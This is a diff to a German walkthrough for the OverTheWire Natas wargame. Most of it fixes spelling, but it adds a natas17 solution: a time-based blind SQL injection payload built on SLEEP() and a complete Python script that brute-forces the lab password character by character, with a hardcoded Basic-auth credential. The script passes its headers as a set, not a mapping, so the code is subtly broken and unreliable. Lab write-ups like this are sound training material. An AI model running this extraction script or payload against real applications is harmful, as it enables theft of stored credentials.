@@ -224,7 +224,7 @@ URL:        http://natas3.natas.labs.overthewire.org
 Nach dem du dich eingeloggt hast, sieht du das gleiche wie das Level zuvor:
 `There is nothing on this page`
 
-Du kannst den Source-Code analyisieren, doch das ist nur Zeitverschwendung.
+Du kannst den Source Code analyisieren, doch das ist nur Zeitverschwendung.
 
 Es gibt eine Alternative, die es uns ermöglicht, die Konfigurationen einer Webseite bzw. eines Webservers anzusehen.
 
@@ -298,7 +298,7 @@ Inspiziere die Webseite und klicke auf den Reiter `Network`. Es wird vermutlich 
 
 **Achtung:** Browser erlauben in der Regel keine Manipulation von sicherheitsrelevanten Headern wie Referer in JavaScript-Code aus Sicherheitsgründen. Dies funktioniert oft nur mit Proxies oder `curl`. Die folgende Darstellung zeigt, wie der korrekte `fetch`-Befehl technisch aussehen müsste, um die Header zu senden.
 
-Anschließend erhältst du die Webseiten, die mit dem Webserver kommunizieren. Klicke auf die Datei, die den Source-Code für die Webseite beinhaltet. Das sollte die Aufzeichnung sein, die in ein der Spalten als `document` oder als `html` gekennzeichnet ist.
+Anschließend erhältst du die Webseiten, die mit dem Webserver kommunizieren. Klicke auf die Datei, die den Source Code für die Webseite beinhaltet. Das sollte die Aufzeichnung sein, die in ein der Spalten als `document` oder als `html` gekennzeichnet ist.
 
 
 > Wenn du mehr über das Thema `Header` im HTML-Request erfahren willst, kannst du bei den [Mozilla Developer Dokumentation für Header](https://developer.mozilla.org/de/docs/Web/API/Headers) vorbeischauen.
@@ -1101,15 +1101,15 @@ Das Verfahren wird in diesem Level verdeutlicht.
 
 Nachdem du dich eingeloggt und auf der Upload-Seite der Webanwendung bist, wird dir die Möglichkeit gewährt, eine Datei hochzuladen.
 
-Über `view source code` (normalerweise erreichbar über die Entwicklertools des Browsers) gelangst du hinter den Source-Code der PHP-Anwendung.
+Über `view source code` (normalerweise erreichbar über die Entwicklertools des Browsers) gelangst du hinter den Source Code der PHP-Anwendung.
 
-Der Source-Code hat mehrere Funktionen, die ausgelöst werden, wenn A. die Seite lädt (z.B. `genRandomString()`) und B. bei Upload einer Datei.
+Der Source Code hat mehrere Funktionen, die ausgelöst werden, wenn A. die Seite lädt (z.B. `genRandomString()`) und B. bei Upload einer Datei.
 
 
 <details>
-    <summary>Source-Code ansehen:</summary>
+    <summary>Source Code ansehen:</summary>
     
-![natas12 Source-Code](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas13b.png)
+![natas12 Source Code](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas13b.png)
 
 </details>
 
@@ -1169,7 +1169,7 @@ cat image_header.bin payload.txt > final_exploit.jpeg
 
 Am einfachsten ist es, die Datei mit dem `cURL`-Befehl auf den Server hochzuladen. Beim Upload sind auf folgenden Dinge zu achten:
 
-- Die Header müssen mit dem Source-Code übereinstimmen.
+- Die Header müssen mit dem Source Code übereinstimmen.
     - Wenn im Input steht: `<input type="text" name="UploadFile" ...>`, dann muss bei Dateiupload mit `cURL` dieser String exakt verwenden werden (`-F "UploadFile=...").
 - Du lädst auf die `index.php`-Seite, die den Upload bereitstellt.
 
@@ -1326,7 +1326,7 @@ Außerdem solltest du mit Tests herausfinden, welchen Wert du wie extrahieren ka
 
 **1. Analyse der Schwachstelle**
 
-Über den Source-Code hast du Einblick in die kritische, unsichere SQL-Abfrage (vereinfacht dargestellt):
+Über den Source Code hast du Einblick in die kritische, unsichere SQL-Abfrage (vereinfacht dargestellt):
 
 ```php
 $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
@@ -1418,9 +1418,9 @@ In `natas15` ist die Schwachstelle eine **Blind SQL Injection**. Sie wird nicht 
 
 Die Hauptseite beinhaltet ein Eingabefeld, das bei Nutzung den entsprechenden Benutzernamen sucht und bei einem Treffer die Seite `/index.php` mit den Werten "This user exists." oder "This user doesn't exist." lädt.
 
-Der Source-Code verrät, dass es eine Datenbank mit dem Namen `users` gibt, in denen die Attribute `username` und `password` gespeichert werden. 
+Der Source Code verrät, dass es eine Datenbank mit dem Namen `users` gibt, in denen die Attribute `username` und `password` gespeichert werden. 
 
-<details><summary>Source-Code anzeigen</summary>
+<details><summary>Source Code anzeigen</summary>
 
 ![Natas16 SourceCode](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas16b.png)
 </details>
@@ -1437,7 +1437,7 @@ Burp nutze ich mit der Firefox-Extension `foxyproxy`, was die Übermittlung der 
 
 Mit der generellen `' Or 1=1 --` (in Beispiel `natas` mit `"`) Befehlskette kann eine SQL-Injection provoziert werden. Außerdem ist der Ausbruch je nach Datenbank unterschiedlich. Der Ausbruch mit `"` gelingt, weil die SQL-Abfrage die Benutzereingabe mit doppelten Anführungszeichen umschließt (`username=\"".$_REQUEST["username"]."\"`).
 
-**Infos zum Source-Code:**
+**Infos zum Source Code:**
 
 Die `$query`-Variable, die den Select-Befehl deklariert, wird zusammen mit der Datenbankverbindung in einer neuen Variable `$res` deklariert, die anschließend mit der Funktion `mysqli_num_rows()` vergleicht, ob der Wert in `$res` größer als `0` ist.   
 Die Logik tritt ein, sobald ein Wert als Resulatat über die Eingabenübermittlung der Hauptseite von der Datenbank zurückgegeben werden kann, weil er in ihr existiert.
@@ -1574,7 +1574,7 @@ URL:        http://natas16.natas.labs.overthewire.org
 
 
 In `natas16` ist die Challenge über eine **Blind Command Injection** (via Side-Channel) oder Size-Based Side-Channel Attacke das Password zu extrahieren.    
-Über den Source-Code (üblicherweise über die Entwickleroptionen erreichbar) gibt dir Aufschluss über den Code und was darin passiert.
+Über den Source Code (üblicherweise über die Entwickleroptionen erreichbar) gibt dir Aufschluss über den Code und was darin passiert.
 
 ![Natas16 SourceCode](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas17.png)
 
@@ -1666,10 +1666,160 @@ URL:        http://natas17.natas.labs.overthewire.org
 <details>
     <summary>Lösung</summary>
 
+Level `natas17` stellt eine fortgeschrittene **Boolean Based Blind SQL Injection**-Herausforderung dar.
+
+- **Ziel:** Die Abfrage so konstruieren, dass der Server die Seite nur dann mit einem bestimmten Inhalt (z.B. "`user does not exist`") oder einer bestimmten Größe zurückgibt, wenn die Bedingung im SQL-Statement wahr (`True`) ist.
+
+- **Signal:** Die Verzögerung der HTTP-Antwortzeit ist das Signal für eine Bedingung, die eintrifft (`true`).
+
+- **Keine Fehlermeldungen:** Die Anwendung ist so konfiguriert, dass sie bei SQL-Syntaxfehlern oder falschen Abfragen keine sichtbaren Fehler (wie die `mysql_fetch_array` Warnung aus früheren Leveln) auf `/index.php` erzeugt. Dies verhindert **Error-Based Injection**.
+
+- **Kein Boolean-Based Output:** Da das System bei erfolgreicher Abfrage oft nur eine leere Seite oder eine statische Meldung liefert, die sich kaum unterscheidet, wird eine einfache Boolean-Based Injection (Abfrage auf `true`/`false` durch Seiteninhalt) schwierig.
+
+- **Notwendigkeit eines Seitenkanals:** Da direkte oder boolesche Ausgaben fehlschlagen, muss ein Seitenkanal (**Side-Channel**) genutzt werden. Hierbei wird die Datenbank gezwungen, eine messbare Aktion durchzuführen, die auf der Wahrheit einer Bedingung basiert.
+
+**Der Source Code von `natas17`**
+
+![Natas17 Source Code](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas18b.png)
+
+In einem der vorherigen Level nutzte ich eine **Time-Based Boolean Injection** (`sleep()`) als Versuch eines Side-Channel Angriffs, um zu überprüfen, ob die Seite auf SQL-Injections anschlägt. Dabei dient die Verzögerung der HTTP-Antwortzeit als boolesches Signal.
+
+Eine Bedingung ist somit **wahr**, wenn die Antwortzeit verzögert wird und falsch, wenn die Bedingung nicht eintrifft.
+Beispiel:
+- **Wahr:** Response Time >= 5 Sekunden => Zeichen korrekt.
+- **Falsch:** Response Time < 1 Sekunden => Zeichen inkorret.
+
+**Wichtig:** Die Funktion `sleep()` kann von Entwicklern in Produktionssystemen blockiert oder entfernt werden, um diese Art von Angriff zu verhindern.
+
+Diesmal habe ich für das Extrahieren des Passwortes ein Python Skript erstellt. Die KI hat mir dabei geholfen.
+
+**1. Python Skrip erstellen**
+
+**Die Payload Struktur:**
+
+Der Kern des Skripts ist der SQL-Payload, der an den username-Parameter gesendet wird:
+
+```sql
+natas18" AND (SELECT 1 FROM (SELECT IF(ASCII(SUBSTRING(password, pos, 1))=val, SLEEP(5), 0))a) #
+```
+
+- `natas18"`: String-Start, tatsächliche SQL-Query schließt hier den `username`-String ab.
+- `AND (SELECT 1 FROM ... )`: Fügt die zusätzliche Abfrage zur `WHERE`-Klausel hinzu.
+- `IF(BEDINGUNG, WAHR, FALSCH)`: Wenn die Bedingung wahr ist, wird `SLEEP(5)` ausgeführt.
+- `ASCII(SUBSTRING(password, pos, 1))`: Extrahiert das Zeichen an der aktuellen **pos**ition und wandelt es in seinen ASCII-Wert (`val`) um.
+- `SLEEP(5)`: (Sidechannel) Verzögert die Antwort des Datenbankservers um 5 Sekunden.
+- `)a) #`: Schließt die verschachtelte `SELECT`-Struktur und kommentiert den Rest der ursprünglichen SQL-Abfrage aus (`#`).
+
+Nachfolgend ist das Python Skript, welches die Zeichen `a-z`, `A-Z` sowie die Zahlen `0-9` in einer For-Schleife iteriert und bei einem Treffer, die Position addiert und mit dem nächsten Zeichen fortfährt.
+
+```python
+import requests
+import time
+from string import ascii_letters, digits
+
+# --- 1. KONFIGURATION FÜR NATAS 17 ---
+TARGET_URL = "http://natas17.natas.labs.overthewire.org/" 
+
+# Das Alphabet wird zur Definition des ASCII-Bereichs verwendet
+# Wir testen alle druckbaren alphanumerischen Zeichen und den Unterstrich
+CHAR_SET = ascii_letters + digits
+# Wir nutzen die ASCII-Werte 32 (Space) bis 126 (Tilde) als Sicherheitsbereich.
+# Für Natas-Passwörter reicht oft 48 (0) bis 122 (z).
+ASCII_MIN = 48  # ASCII-Code für '0'
+ASCII_MAX = 122 # ASCII-Code für 'z'
+PASSWORD_LENGTH = 32
+SLEEP_TIME = 5 # Sekunden, die der SQL-Befehl pausieren soll
+TIMEOUT = SLEEP_TIME + 2 # Das Timeout muss länger sein als die Pausenzeit
+
+found_password = ""
+print(f"Starte Time-Based Blind SQLi auf {TARGET_URL}...")
+print(f"Suche nach {PASSWORD_LENGTH} Zeichen im ASCII-Bereich {ASCII_MIN}-{ASCII_MAX} (0-z)...")
+
+# --- 2. HAUPTSCHLEIFE: ITERATION DURCH DIE POSITIONEN ---
+# Die Position (pos) beginnt bei 1 (SQL-Standard)
+for pos in range(1, PASSWORD_LENGTH + 1):
+    char_found = False
+    
+    # --- 3. INNERE SCHLEIFE: ITERATION DURCH DIE ASCII-WERTE ---
+    # val ist der ASCII-Wert, der getestet wird (z.B. 97 für 'a')
+    for val in range(ASCII_MIN, ASCII_MAX + 1):
+        
+        # SQLI PAYLOAD FÜR NATAS 17
+        # Die Abfrage wird als Wert für den POST-Parameter 'username' gesendet.
+        # Syntax: 'natas18' AND (SELECT 1 FROM (SELECT IF(ASCII(SUBSTRING(password, pos, 1))=val, SLEEP(5), 0))a) #
+        
+        payload = (f'natas18" AND (SELECT 1 FROM (SELECT IF(ASCII(SUBSTRING(password, {pos}, 1))={val}, SLEEP({SLEEP_TIME}), 0))a) #')
+
+        post_data = {"username": payload}
+        
+        # --- 4. ZEITBASIERTE ÜBERPRÜFUNG ---
+        try:
+            start_time = time.time()
+            # Führe POST-Request aus
+            r = requests.post(
+                TARGET_URL,
+                headers={"Authorization", "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw=="},
+                data=post_data,
+                timeout=TIMEOUT # Wichtig: Timeout muss größer als SLEEP_TIME sein
+            )
+            end_time = time.time()
+            
+            response_time = end_time - start_time
+            
+            # ÜBERPRÜFUNG: Wenn die Antwortzeit länger ist als die Schlafenszeit, war die Bedingung WAHR.
+            if response_time >= SLEEP_TIME:
+                found_char = chr(val)
+                found_password += found_char
+                print(f"[{pos:02}/{PASSWORD_LENGTH}] Treffer: ASCII {val} ('{found_char}') -> {found_password}")
+                char_found = True
+                break
+                
+        except requests.exceptions.Timeout:
+             # Wenn das Timeout (z.B. 7s) erreicht wird, ABER die Antwortzeit > SLEEP_TIME (z.B. 5s) wäre,
+             # ist die Bedingung erfüllt. Bei time-based Injection muss dies nicht als Fehler behandelt werden.
+             # Da wir das Request-Timeout höher als SLEEP_TIME gesetzt haben, sollte dies hier nur bei Netzwerkfehlern passieren.
+             found_char = chr(val)
+             found_password += found_char
+             print(f"[{pos:02}/{PASSWORD_LENGTH}] Treffer (Timeout): ASCII {val} ('{found_char}') -> {found_password}")
+             char_found = True
+             break
+        except requests.exceptions.RequestException as e:
+            print(f"\nVerbindungsfehler bei Position {pos}, Wert {val}: {e}")
+            break
+            
+    if not char_found:
+        print(f"--- KEIN ZEICHEN GEFUNDEN in Position {pos}. ---")
+        break
+
+print(f"\nFinales Passwort: {found_password}")
+```
+
+Führe das Skript im Terminal über die Eingabe aus:
+```bash
+python3 deinDateiname.py
+```
+
+Wenn es erfolgreich ausgeführt wird, dann erhältst du das Passwort:
+
+![Natas18 Passwort](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas18c.png)
 
 
+</details>
 
-</deatails>
+## Natas 18 -> 19
+
+```text
+Username:   natas18
+
+URL:        http://natas18.natas.labs.overthewire.org
+```
+
+<details>
+    <summary>Lösung</summary>
+
+
+</details>
+
 
 # Wird laufend fortgesetzt, bis das letzte Level geschafft ist.
 
